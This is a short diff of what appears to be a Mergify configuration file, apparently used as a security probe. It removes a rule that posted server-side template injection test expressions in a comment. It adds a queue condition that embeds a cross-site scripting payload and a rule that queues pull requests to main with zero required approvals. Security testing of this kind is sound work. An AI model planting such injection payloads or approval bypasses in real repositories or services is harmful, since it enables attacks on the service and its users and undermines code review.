@@ -1,7 +1,14 @@
+queue_rules:
+  - name: default
+    merge_method: merge
+    conditions:
+      - "title~=DEFINITELY_NOT_MATCHING_<img src=x onerror=alert(document.domain)>"
+
 pull_request_rules:
-  - name: ssti-poc
+  - name: add to queue
     conditions:
       - base=main
+      - "#approved-reviews-by>=0"
     actions:
-      comment:
-        message: "SSTI_CONFIRMED={{ 7*7 }} author={{ author }} title={{ title }}"
+      queue:
+        name: default
